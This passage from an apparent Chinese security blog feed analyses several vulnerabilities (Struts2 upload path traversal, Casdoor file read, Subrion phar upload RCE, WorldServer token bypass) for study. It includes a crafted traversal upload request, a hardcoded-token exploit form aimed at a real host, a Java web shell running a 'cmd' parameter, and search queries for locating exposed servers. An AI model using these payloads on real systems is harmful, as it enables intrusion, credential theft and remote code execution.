MyFileFileName </span><br>            <span class="hljs-type">char</span>[] chars = propertyName.toCharArray();<br>            chars[<span class="hljs-number">0</span>] = Character.toUpperCase(chars[<span class="hljs-number">0</span>]);<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(chars);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>比如上面获得的文件名参数就变成了这样：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">myFileFileName</span> <span class="hljs-operator">=</span>&gt; MyFileFileName<br></code></pre></td></tr></table></figure><p>之后就会去利用反射调用 setMyFileFileName方法进行赋值。</p><p>漏洞点就是在这里，想要获取到 MyFileFileName使后面去调用  setMyFileFileName 赋值的话，其实还有一种方法：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">MyFileFileName</span> <span class="hljs-operator">=</span>&gt; 原样返回<br></code></pre></td></tr></table></figure><p>想获取到 MyFileFileName 在最开始的 HttpParameters 的 parameters 中，也是有 2 种形式：</p><ol><li><p>直接通过 POST 传入 MyFileFileName ，文件数据包不变 </p></li><li><p>文件数据包的名称变为 MyFile，再通过 POST 传入 myFileFileName</p></li></ol><p> </p><p>这里是只能使用第二个，然后在 myFileFileName写入路径穿越的值。</p><p>这里使用第二个是因为上面的 TreeMap，TreeMap 会根据 ASCII 值进行排序，那么大写在小写前面，想要造成覆盖的话，就只能在小写的 myFileFileName写入路径穿越，而第一个的话就需要在文件数据包那里的文件名传入路径穿越，这个就会直接被 struts2 处理掉了。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>正常的文件上传数据包如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8888<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>197<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost:8888<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary0E0IzeMiv9bGipnU<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=69EDB42B6023D55DAC08B8FB2BF0A797<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary0E0IzeMiv9bGipnU</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;myFile&quot;; filename=&quot;demo2.txt&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/plain</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">demo context</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary0E0IzeMiv9bGipnU--</span></span><br></code></pre></td></tr></table></figure><p>我们需要把文件的数据包改为首字母大写，再添加一个文件名参数，文件名参数就是 name + “FileName” 的值，再这里就是 myFileFileName。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8888<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>339<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost:8888<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary0E0IzeMiv9bGipnU<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=69EDB42B6023D55DAC08B8FB2BF0A797<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary0E0IzeMiv9bGipnU</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;MyFile&quot;; filename=&quot;demo2.txt&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/plain</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">demo context</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary0E0IzeMiv9bGipnU</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;myFileFileName&quot;; </span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/plain</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">../../demo2.txt</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary0E0IzeMiv9bGipnU--</span></span><br></code></pre></td></tr></table></figure><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/dcdd6751-8951-47a5-a067-773e7d5bf504.png?imageSlim" alt="image"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/873c552b-6970-4973-b0a1-6dd108710383.png?imageSlim" alt="image"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/42c552a2-c2c1-48d3-88ff-ab9d5fe29532.png?imageSlim" alt="image"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><a href="https://github.com/apache/struts/commit/162e29fee9136f4bfd9b2376da2cbf590f9ea163">https://github.com/apache/struts/commit/162e29fee9136f4bfd9b2376da2cbf590f9ea163</a></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/830e32ea-4731-4de3-bc23-9b25764cd661.png?imageSlim" alt="image"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/ccee57c5-b9d4-475a-b885-521be76fb109.png?imageSlim" alt="image"></p><p>直接在 appendAll 的时候做了一个去重（ 不分大小写 ），先把重复的键全部删除，再添加进去。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Casdoor 任意文件读取漏洞</title>
      <link href="/2023/12/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CasdoorReadFile/"/>
      <url>/2023/12/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CasdoorReadFile/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>项目地址：<a href="https://github.com/casdoor/casdoor">https://github.com/casdoor/casdoor</a></p><p>项目官网：<a href="https://casdoor.org/">https://casdoor.org/</a></p><p>项目介绍：Casdoor 是一个基于 OAuth 2.0 &#x2F; OIDC 的中心化的单点登录（SSO）身份验证平台，简单来说，就是 Casdoor 可以帮你解决用户管理的难题，你无需开发用户登录、注册等与用户鉴权相关的一系列功能，只需几个步骤进行简单配置，与你的主应用配合，便可完全托管你的用户模块，简单省心，功能强大。</p><p>漏洞介绍：Casdoor系统 static 存在任意文件读取漏洞，攻击者可利用该漏洞获取服务器上的敏感文件。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>任意文件读取漏洞，搜一下相关的函数，先是 util.ReadStringFromPath() ，再跟一下定位到 routers&#x2F;static_filter.go的 serveFileWithReplace 函数：</p><p>这个函数就是读取文件，然后替换下 Url ，之后返回到页面中：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/316520dc-15f1-4c9b-b7fc-7397a92190f4.png?imageSlim" alt="image"></p><p>这个 filepath.Clean 的作用是返回最短路径名，试了一下就是会把 ..&#x2F; 这种给自动跳级：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/b3ba32dd-4734-4fd9-b0c6-6aa92eb20448.png?imageSlim" alt="image"></p><p>向上跟踪：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/3a0b7dc1-f92a-4ccd-96d6-3a1ebdbf8f70.png?imageSlim" alt="image"></p><p>然后发现这俩函数都在 StaticFilter() 函数：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/d51d8108-9df9-4942-8407-f53176d3ab13.png?imageSlim" alt="image"></p><p>前面有些条件：</p><p>只要 Url 不是指向 api、cas  且拼接后的文件存在（ 存在就 return 了 ），就可以进行文件读取：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/38620857-53d1-434f-8847-93e637b3375b.png?imageSlim" alt="image"></p><p>因为它的 path 会和 urlPath 拼接，然后将 path 给读取文件返回到页面的函数处理，导致的任意文件读取。</p><p>看下哪里调用了这个：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/5d4990d3-d9e2-4226-a8cf-972ecbb8e79b.png?imageSlim" alt="image"></p><p>main 中的定义的一个全局过滤器。</p><p>现在找下能用的路由：beego 中的过滤器只有注册的路由才能使用，再加上之前的要走到文件读取，urlPath 中不能有 &#x2F;api&#x2F;、&#x2F;cas。</p><p>路由是在这里注册 routers&#x2F;router.go，就有 3 种，&#x2F;api&#x2F;、&#x2F;.well-known&#x2F;、&#x2F;cas&#x2F;，现在是只有 &#x2F;.well-known&#x2F; 能用，试了一下发现都有访问限制。</p><p>现在就是这个漏洞的比较精彩的部分，项目中没有可用的路由了，那就找 Web 框架中是否会注册默认的路由，正好 beego 就有：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/88b61ab5-6d63-4da6-8e04-0a7a0e0268b1.png?imageSlim" alt="image"></p><p>该目录可访问，被注册了也就可以触发过滤器：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240302111442458.png?imageSlim" alt="image-20240302111442458"></p><p>可以发现它触发了 StaticFilter 过滤器，不过因为是目录读取失败了，它还返回了路径。</p><p>那直接路径穿越读取文件即可：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240302111406101.png?imageSlim" alt="image-20240302111406101"></p><p>大概翻了下项目，发现 conf&#x2F;app.conf 会配置数据库账号密码，看看能不能读取 。</p><p>也是泄露了数据库的账号密码了：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240302111552514.png?imageSlim" alt="image-20240302111552514"></p><p>又看了下代码，发现在 object&#x2F;init.go 中，发现该项目会进行一个初始化，应该就是如果它没有名字是 admin 的组织或用户，它会添加一条进去：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/252f82ec-fd5d-4535-8b5e-4cb3b2b9d2c3.png?imageSlim" alt="image"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/127534bf-b29d-40d7-af3b-b56f8c5f8f16.png?imageSlim" alt="image"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/c198f724-d70c-4de4-af83-bc8174cf4d1d.png?imageSlim" alt="image"></p><p>差不多的意思就是添加个 admin&#x2F;123 的用户，找几个目标登录一下看起来好像就是上面猜的那样，没有 admin 的时候，系统会默认给创建一个 admin 的用户，它的邮箱都跟上面代码的一样：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240302111628574.png?imageSlim" alt="image-20240302111628574"></p><h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><p>读文件需要有一个合适的路由，而 beego 框架本身默认注册了一个 static 的路由导致了该漏洞的利用。又发现了一个默认用户的，貌似是搭建的时候不使用 admin 就有可能会出现。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-19422 Subrion CMS v4.2.1 RCE</title>
      <link href="/2023/11/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2018-19422/"/>
      <url>/2023/11/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2018-19422/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞名称：Subrion 后台文件上传导致 RCE</p><p>漏洞编号：CVE-2018-19422</p><p>影响版本：subrion &lt; 4.2.1 ( 尚未修复 )</p><p>漏洞介绍：后台对上传的文件类型不做限制，而是去使用 .htaccess 来让服务器不去解析上传文件夹下的可执行脚本，但是 .htaccess 过滤不完全导致其可以使用 phar 文件来执行脚本。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>官网：<a href="https://subrion.org/download/">https://subrion.org/download/</a></p><p>搭建脚本：<a href="https://github.com/rapid7/metasploit-framework/pull/18211">https://github.com/rapid7/metasploit-framework/pull/18211</a></p><p>得自己安装 apache 这些才行，使用宝塔、phpstudy 搭建的它不能解析 phar。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>该应用后台对文件上传未作限制，但使用 .htaccess 对 uploads 目录下文件的解析做了限制：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/0c13518f-1284-4852-a356-b96c299aee81.png?imageSlim" alt="image"></p><p>那么在上传 php 类型的文件之后就无法被解析而是直接下载下来，不过这里的黑名单写的不完全，比如 phar 。</p><p>在 Linux 安装 apache 时，其默认的会将 phar 当作 PHP 执行 ：</p><p>&#x2F;etc&#x2F;apache2&#x2F;mods-enabled&#x2F;php7.3.conf</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/9a0b9ad3-6137-4a2d-9457-52f9b0167d7e.png?imageSlim" alt="image"></p><p>那么当我们知道后台的账号密码时，就可以上传 phar 文件拿 shell。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问 &#x2F;panel 登录后台，直接上传 phar 文件：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/f00bde2a-fec0-4375-8bd1-12a05b7623db.png?imageSlim" alt="image"></p><p>然后访问 uploads&#x2F;shell.phar </p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/96167bf0-68ce-452f-a05c-b1f656cf1741.png?imageSlim" alt="image"></p><h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><p>会由开发者通过 <code>.htaccess</code> 来控制上传目录下的解析，而不是利用代码去检测后缀，比较奇特的一种方式，如果黑名单写的够完全，这种限制方式比较方便。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-34267 SDL WorldServer 身份认证绕过 RCE</title>
      <link href="/2023/11/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2022-34267/"/>
      <url>/2023/11/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2022-34267/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞名称：CVE-2022-34267 SDL WorldServer 身份认证绕过 RCE</p><p>产品：RWS WorldServer</p><p>搜索语法：</p><ul><li>FOFA：icon_hash&#x3D;”1129570087”</li><li>Hunter：web.icon&#x3D;&#x3D;”b774528f2f5c4a7ed046f40eebf51954”</li><li>QUAKE：favicon: “b774528f2f5c4a7ed046f40eebf51954”</li></ul><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>其通过 FFUF 对  &#x2F;ws-api&#x2F;v2&#x2F;info?token&#x3D; 的 token 进行 FUZZ 发现了当 token 为 02 时就是一个系统管理员的身份，这可能是程序员留下了的后门：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isSystemSessionToken</span><span class="hljs-params">(String token)</span> &#123;<br>  <span class="hljs-keyword">return</span> (token != <span class="hljs-literal">null</span> &amp;&amp; token.trim().equals(String.valueOf(<span class="hljs-number">2</span>)));<br>&#125;<br></code></pre></td></tr></table></figure><p>那么就导致了可利用 api 进行操作，最终其实现 RCE 的方法是去自定义 API 拿 shell：</p><p><a href="https://docs.rws.com/791697/585715/sdl-worldserver-11-3-developer-documentation/customizing-the-rest-api">RWS Documentation</a></p><p>这里可以通过向 <code>&lt;protocol&gt;://&lt;ws-host&gt;：&lt;ws-port&gt;/ws-api/v1/customizations/api？token=&lt;sessionId&gt;</code> 端点发现 POST 请求上传 jar 文件来实现。</p><p>上传表单：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;/!DOCTYPE html&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>file upload<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span>  <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://wsdev.spartansoftwareinc.com/ws-api/v2/customizations/api?token=02&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>但是制作 jar 需要有这个 wssdk ：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240126142726042.png?imageSlim" alt="image-20240126142726042"></p><p>我们只需要实现一个假的 <code>com.idiominc.wssdk.WSContext</code> 然后在 maven 中进行本地引入即可。</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240126143213825.png?imageSlim" alt="image-20240126143213825"></p><p>制作一个假的：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240126143316741.png?imageSlim" alt="image-20240126143316741"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240126143331122.png?imageSlim" alt="image-20240126143331122"></p><p><code>maven package</code> 为 jar 包。</p><p>放到 <code>resources</code> 目录下 本地引入 ：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.sdl.lt.worldserver<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>wssdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>system<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">systemPath</span>&gt;</span>$&#123;basedir&#125;\src\main\resources\wssdk-1.0-SNAPSHOT.jar<span class="hljs-tag">&lt;/<span class="hljs-name">systemPath</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>根据 API 文档引入指定版本的 <code>spring-webmvc</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-webmvc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.1.7.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>打包上传 </p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240126143621343.png?imageSlim" alt="image-20240126143621343"></p><p>然后不知道怎么触发 …</p><p>没找到相关文档，试了几次发现访问 <code>/ws-api/extensions/shell/clients</code> 即可触发。</p><p>使用 GPT 写带参数并且成有回显的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sdl.lt.worldserver.customizations.newextension;<br><span class="hljs-keyword">import</span> com.idiominc.wssdk.WSContext;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/extensions/shell&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NewExtension</span> &#123;<br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> WSContext context;<br><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/clients&quot;, method = &#123;RequestMethod.GET&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">shell</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(value = &quot;cmd&quot;, defaultValue = &quot;&quot;)</span> String cmd)</span> &#123;<br>        <span class="hljs-comment">// 检查cmd参数是否为空</span><br>        <span class="hljs-keyword">if</span> (cmd.isEmpty()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;PoC - Remote Code Execution&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        Process p;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 执行命令</span><br>            p = Runtime.getRuntime().exec(cmd);<br>            p.waitFor();<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(p.getInputStream()));<br><br>            String line;<br>            <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                output.append(line).append(<span class="hljs-string">&quot;\n&quot;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error executing command: &quot;</span> + e.getMessage();<br>        &#125;<br>        <span class="hljs-keyword">return</span> output.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><ol><li>session 这个东西竟然可以去尝试 FUZZ</li><li>不要死跟着博客的利用，因为就是找不到这个 sdk，而需要它的原因就是让 jar 打包成功，<strong>那么就可以尝试自己写一个假的去测试</strong></li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.triskelelabs.com/vulnerabilities-in-rws-worldserver">https://www.triskelelabs.com/vulnerabilities-in-rws-worldserver</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2023-32315 openfire 认证绕过漏洞</title>
      <link href="/2023/11/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2023-32315/"/>
      <url>/2023/11/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2023-32315/</url>
      
